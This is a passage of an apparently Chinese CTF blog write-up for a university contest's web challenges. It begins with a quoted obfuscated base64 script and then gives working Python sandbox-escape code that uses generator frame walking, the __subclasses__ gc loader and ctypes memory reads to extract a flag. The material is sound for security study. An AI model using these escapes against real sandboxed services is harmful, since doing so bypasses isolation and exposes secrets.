W10sXzB4OWU3NTk1PV8weDc2MmMyOCgpW18weDUxMjUxYSgweDIwYSwnSUNCWicpXShfMHg1MTI1MWEoMHgyMTQsJ2VGVTknKSlbMHgxODE4KzB4ZioweDI4NCstMHgxNDljKjB4M10sXzB4Mjc3M2ZlPSgtMHgxYzU1Ky0weDNhKjB4YWErMHg0MzE1KSpfMHg0MTk4NGUvKDB4MSoweGMwNystMHhkKi0weDJkZCstMHgzYioweGQ0KSxfMHgxYjk5ZjE9LTB4MSoweGU3YisweDEyMGQrLTB4N2EqMHg3LSgweDFkYzUqMHgxKzB4MWEzNSotMHgxKy0weGMqMHg0NykqXzB4NDE5ODRlLygtMHgxOTQwKjB4MSsweDI1MzUrLTB4YjkxKTtfMHgxNWE4Y2IoKT49LTB4NyoweDQxKzB4MjY1NyotMHgxKzB4MjgxZSswLjk5OTkmJihfMHg5ZTc1OTU9XzB4YzE2YzE2KClbXzB4NTEyNTFhKDB4MjBjLCdVOE5bJyldKF8weDUxMjUxYSgweDIyYSwnW1NwdicpKVstMHg4MDUrMHgyMDYqMHgxKzB4NjAwXSxfMHg1NmUwYjA9ISFbXSk7XzB4MTU3MTViKF8weDUxMjUxYSgweDIwNywnc0N2TCcpLF8weDllNzU5NVtfMHg1MTI1MWEoMHgyMTMsJ0RocyonKV0oL1x7YVx9L2dtLF8weDI3NzNmZStfMHg1MTI1MWEoMHgxZmUsJ0BsKmQnKSlbJ3JlcGxhY2UnXSgvXHtiXH0vZ20sXzB4MWI5OWYxK18weDUxMjUxYSgweDFmZSwnQGwqZCcpKSk7aWYoXzB4NTZlMGIwKV8weDIwZmRlOCgpO31fMHgzNTQ2OTgoZnVuY3Rpb24oKXtfMHg1ZjRhZDIoXzB4MzFhYzZkKSgpO30sLTB4MjJiOCstMHgzKjB4N2Q5KzB4YzBiKjB4NSksXzB4MzU1YWY4KF8weGNmM2RhYSwweDFjMTArMHg1MDUrLTB4MWY1Myk7fWVsc2V7dmFyIF8weDM4ZDk2MT0hW10sXzB4NDhiOGFhPV8weDM2ZjdkNygpWydzcGxpdCddKF8weDUxMjUxYSgweDIwZSwndChLeCcpKVsweDFhZTIrLTB4N2E5Ky0weDEzMzldLF8weDQ4YTRhYT0oLTB4MjI3YSoweDErMHg3YyoweDFhKzB4MTYxZSkqXzB4NzkzNmQwLygtMHgzKjB4YThkKzB4MjI3NSstMHgyNmEpLF8weDU0ODcwZD0weDIzZmYrMHgxKjB4MTBjZistMHgzNDkyLSgweDE2NjMrLTB4MmEzKi0weDMrLTB4MWUxMCkqXzB4NzkzNmQwLygweDcqLTB4MmYyKy0weDFjYjUrMHgzMWI3KTtfMHgyODBiYmYoKT49LTB4MiotMHg3YWMrLTB4N2QqMHgxMystMHg2MTErMC4wMDAxJiYoXzB4NDhiOGFhPV8weDM2ZjdkNygpW18weDUxMjUxYSgweDIyOCwneEBiSicpXShfMHg1MTI1MWEoMHgxZWYsJ0prYm4nKSlbMHhmMzErMHgyNGQqLTB4MTArLTB4NTY4Ki0weDRdLF8weDM4ZDk2MT0hIVtdKTtfMHg0ZDAzMmQoXzB4NTEyNTFhKDB4MWYzLCdmJShoJyksXzB4NDhiOGFhWydyZXBsYWNlJ10oL1x7YVx9L2dtLF8weDQ4YTRhYStfMHg1MTI1MWEoMHgxZmUsJ0BsKmQnKSlbXzB4NTEyNTFhKDB4MWZhLCcxTWMwJyldKC9ce2JcfS9nbSxfMHg1NDg3MGQrXzB4NTEyNTFhKDB4MWZlLCdAbCpkJykpKTt9fV8weDEzYTE1NShmdW5jdGlvbigpe3ZhciBfMHg0ZDliMzE9XzB4NTEyNTFhO2lmKF8weDRkOWIzMSgweDIwOCwnQWRBRicpIT09J3FGakdoJyl7dmFyIF8weDQzMjgwNz1fMHgxMjQ1NDY/ZnVuY3Rpb24oKXt2YXIgXzB4NTNkYjQ2PV8weDRkOWIzMTtpZihfMHg0YmE0Njcpe3ZhciBfMHgxZDA5MmU9XzB4YWE4M2RkW18weDUzZGI0NigweDIwNCwnNWVFTScpXShfMHgxMzIxMGMsYXJndW1lbnRzKTtyZXR1cm4gXzB4NTY4MTZhPW51bGwsXzB4MWQwOTJlO319OmZ1bmN0aW9uKCl7fTtyZXR1cm4gXzB4M2U3MzU3PSFbXSxfMHg0MzI4MDc7fWVsc2UgXzB4YzRiZThkKF8weGM0YmU4ZCkoKTt9LC0weDEqMHgyMGMzKy0weGMqLTB4MTM3Ky0weDUqLTB4NDA3KSxfMHgxM2ExNTUoXzB4NGQzZmI0LDB4MjM1MSotMHgxKy0weDdiKi0weDMrMHgyM2EyKTt9O30pKCkpOw==&quot;</span>))</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="菜狗工具-2"><a href="#菜狗工具-2" class="headerlink" title="菜狗工具#2"></a>菜狗工具#2</h1><p>python栈帧沙箱逃逸</p>
+<h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><p>一直往上找，直到找到app.py所在的栈帧，然后读取全局变量，poc：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = <span class="built_in">next</span>(g)</span><br><span class="line">    <span class="built_in">print</span>(frame)</span><br><span class="line">    <span class="built_in">print</span>(frame.f_back)</span><br><span class="line">    <span class="built_in">print</span>(frame.f_back.f_back.f_globals)</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240609173019525.png" alt="image-20240609173019525"></p>
+<p>这里因为源码里对flag重复赋值了一次导致直接查app.py的<code>f_globals</code>得不到flag</p>
+<p>需要对其栈帧进行反汇编拿到初次赋值的flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">out = io.StringIO()     <span class="comment"># 内存创建字符串I/O流</span></span><br><span class="line">dis.dis(frame.f_code,file=out)   <span class="comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span></span><br><span class="line">content = out.getvalue()    <span class="comment">#获取反汇编的结果</span></span><br><span class="line">out.close()</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
+
+<p>参考官方wp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sys = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line">io = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;io&#x27;</span>)</span><br><span class="line">dis = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;dis&#x27;</span>)</span><br><span class="line">threading = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())     <span class="comment">#获取所有活跃线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread())    <span class="comment">#获取主线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread().ident)   <span class="comment"># 获取主线程标识符</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames())      <span class="comment"># 获取所有线程的堆栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames()[threading.main_thread().ident]) <span class="comment">#获取到主线程的堆栈帧对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = sys._current_frames()[threading.main_thread().ident]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> frame <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	out = io.StringIO()     <span class="comment"># 内存创建字符串I/O流</span></span><br><span class="line">	dis.dis(frame.f_code,file=out)   <span class="comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span></span><br><span class="line">	content = out.getvalue()    <span class="comment">#获取反汇编的结果</span></span><br><span class="line">	out.close()</span><br><span class="line">	<span class="built_in">print</span>(content)</span><br><span class="line">	frame = frame.f_back</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240609174217957.png" alt="image-20240609174217957"></p>
+<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>由于过滤了<code>__import__</code>，这里要自己找一个能加载模块的类</p>
+<p>最后选择了<code>_frozen_importlib.BuiltinImporter</code>这个可以导入内置模块的查找器，然后加载gc模块，获取所有变量对象即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print([].__class__.__base__.__subclasses__()[84].load_module(&#x27;gc&#x27;).get_objects())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240609174103845.png" alt="image-20240609174103845"></p>
+<h4 id="法三："><a href="#法三：" class="headerlink" title="法三："></a>法三：</h4><p>晨曦✌的思路：</p>
+<blockquote>
+<p>可以利用指针，把内存的内容读出来，但需要定位一个大致的范围，盲目读取浪费时间</p>
+</blockquote>
+<p>先利用栈帧逃逸到全局，这样就能拿<code>__builtins__</code>和被覆盖后的<code>flag</code>的地址（这里可以参考L3HCTF2024 intractable problem）</p>
+<p>全局<code>flag</code>的地址用<code>id()</code>读出来即可</p>
+<p>接着是利用<code>ctypes</code>模块的指针，用<code>id()</code>将<code>flag</code>地址周围的值读一下，用<code>ctypes.cast</code>实现一个从内存读源码的操作</p>
+<blockquote>
+<p><code>ctypes.cast(obj, type)</code> 此函数类似于 C 的强制转换运算符。 它返回一个 <em>type</em> 的新实例，该实例指向与 <em>obj</em> 相同的内存块。 <em>type</em> 必须为指针类型，而 <em>obj</em> 必须为可以被作为指针来解读的对象。</p>
+</blockquote>
+<p>这里用了 char 指针，读出来的是一个字符串，再加上flag头作为判断，可以很快读出flag</p>
+<p>每次位移8的倍数。（可以自行对比任意两个变量的地址，可以发现它们的差值都是8的倍数）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line">frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">b = frame.f_back.f_globals</span><br><span class="line">flag_id=<span class="built_in">id</span>(b[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">ctypes = b[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"><span class="comment">#print(ctypes)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">	txt = ctypes.cast((flag_id-<span class="number">8</span>*i),ctypes.c_char_p).value</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line">		<span class="built_in">print</span>(txt)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240609174155984.png" alt="image-20240609174155984"></p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/blue-whale_logo.png"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<div>分享</div>
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2024/04/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE/" title="JAVA反序列化——CB链" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
+								NepCTF2024部分web			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								八月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里
+12if os.path.islink(new_file):    return &...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/nepctf2024/nepctf2024.png" alt="NepCTF2024部分web"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
+								2024第七届巅峰极客部分wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								八月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/dfjk/dfjk.png" alt="2024第七届巅峰极客部分wp"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">
+								2024春秋杯部分wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 6日, 2024				
+							</p>
+							<p class="relate-post-content">
+								brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架
+
+一眼ssti模版注入，
+1?name=&#123;&#123;g.pop.__globals__.__builtins__.__im...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024春秋杯/2024春秋杯.png" alt="2024春秋杯部分wp"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">
+								PolarCTF2024夏季个人挑战赛wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 10日, 2024				
+							</p>
+							<p class="relate-post-content">
+								扫扫看不用扫，猜测是flag.php
+
+
+flag{094c9cc14068a7d18ccd0dd3606e532f}
+
+debudaoflag在cookie里：
+
+
+flag{72077a55w312584wb1aaa88888cd...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛wp"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp">
+								PolarCTF2024春季个人挑战赛wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 30日, 2024				
+							</p>
+							<p class="relate-post-content">
+								机器人打开页面：
+
+一眼robots.txt
+123User-agent: *Disallow: /27f5e15b6af3223f1176293cd015771dFlag: flag&#123;4749ea1ea481a5d
+
+只有...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024春季个人挑战赛wp"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/" title="DASCTF2024校赛">
+								DASCTF2024校赛			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 20日, 2024				
+							</p>
+							<p class="relate-post-content">
+								cool_indexserver.js:
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/" title="DASCTF2024校赛">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/DASCTF2024校赛/2024dasctf.png" alt="DASCTF2024校赛"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/09/XYCTF2024/" title="XYCTF2024">
+								XYCTF2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 9日, 2024				
+							</p>
+							<p class="relate-post-content">
+								ezhttp打开是登录页面，先看源码，源码提示：
+1&lt;!-- 为了防止忘记密码，我把它们放在某个地方了 --&gt;
+
+第一反应是robots.txt，进去看看。
+
+得到&#x2F;l0g1n.txt，进入得到帐号密码：
+12u...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/09/XYCTF2024/" title="XYCTF2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="XYCTF2024"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/25/NKCTF2024/" title="NKCTF2024">
+								NKCTF2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								my first cmshttps://avd.aliyun.com/detail?id=AVD-2024-27622
+弱口令登录
+username : admin
+password : Admin123
+登录进去后：
+
+全世界最简单...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/25/NKCTF2024/" title="NKCTF2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/4.jpg" alt="NKCTF2024"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/19/DubheCTF-2024/" title="DubheCTF_2024">
+								DubheCTF_2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 19日, 2024				
+							</p>
+							<p class="relate-post-content">
+								师傅们太强了，跟师傅们打比赛能学到很多东西，我就作出来一个最简单的题&#x3D;-&#x3D;
+Master of Profile参考链接：https://cn-sec.com/archives/2105254.html想读配置文件，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/19/DubheCTF-2024/" title="DubheCTF_2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/28.jpg" alt="DubheCTF_2024"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/" title="青少年ctf 2024">
+								青少年ctf 2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 29日, 2024				
+							</p>
+							<p class="relate-post-content">
+								by:Infernity
+Easy md5需要我们上传两个md5相同的PDF文件。
+新建一个空白PDF文件，拖到fastcoll里得到另外两个pdf文件，上传进去得到flag。
+php的后门是php 8.1dev版本漏洞
+https:...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/" title="青少年ctf 2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/3.jpg" alt="青少年ctf 2024"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: '333--',
+			clientSecret: '333--',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'annie-gitalk',
+			owner: 'Sariay',
+			admin: 'Sariay',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+				</div>
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
